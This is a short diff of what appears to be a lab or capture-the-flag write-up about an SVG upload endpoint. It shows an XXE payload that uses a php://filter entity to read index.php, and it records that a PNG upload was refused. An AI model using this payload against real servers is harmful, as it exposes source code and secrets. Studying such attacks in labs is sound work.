@@ -35,3 +35,8 @@
   <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
   <svg>&xxe;</svg>
   ```
+---
+
+
+We attempted to upload a simple `.png` image but we received the response with the message "Only SVG images are allowed":
+![image](https://github.com/user-attachments/assets/36479000-2f72-4e4b-8893-99deeb070204)
